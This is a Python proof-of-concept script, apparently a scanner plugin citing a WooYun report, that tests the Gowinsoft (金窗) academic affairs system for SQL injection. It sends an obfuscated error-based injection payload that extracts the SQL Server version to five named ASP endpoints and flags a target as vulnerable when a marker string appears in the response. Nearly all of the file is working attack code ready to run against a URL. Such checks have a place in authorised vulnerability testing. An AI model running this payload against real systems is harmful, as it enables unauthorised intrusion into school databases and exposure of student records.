#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 金窗教务系统存在多处SQL注射漏洞
referer: http://www.wooyun.org/bugs/wooyun-2010-0101234
author: Lucifer
description: 金窗教务系统多处SQL注入。
'''
import sys
import requests



class gowinsoft_jw_multi_sqli_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "%27AnD%201=CoNvErT(InT,(ChAr(71)%2BChAr(65)%2BChAr(79)%2BChAr(32)%2BChAr(74)%2BChAr(73)%2BChAr(64)%2B@@VeRsIon%20))%20AnD%20%27a%27=%27a"
        urls = ["/jiaoshi/shizi/shizi/textbox.asp?id=1",
                "/jiaoshi/sj/shixi/biyeshan1.asp?id=1",
                "/jiaoshi/sj/shiyan/xuankeda.asp?bianhao=1",
                "/jiaoshi/xueji/dangan/sdangangai1.asp?id=1",
                "/jiaoshi/xueji/shen/autobh.asp?jh=1"]
        vulnurl = self.url + payload
        try:
            for turl in urls:
                vulnurl = self.url + turl + payload
                req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
                if r"GAO JI@Microsoft" in req.text:
                    return "[+]存在金窗教务系统存在多处SQL注射漏洞...(高危)\tpayload: "+vulnurl

        except:
            return "[-]connect timeout"

if __name__ == "__main__":

    testVuln = gowinsoft_jw_multi_sqli_BaseVerify(sys.argv[1])
    testVuln.run()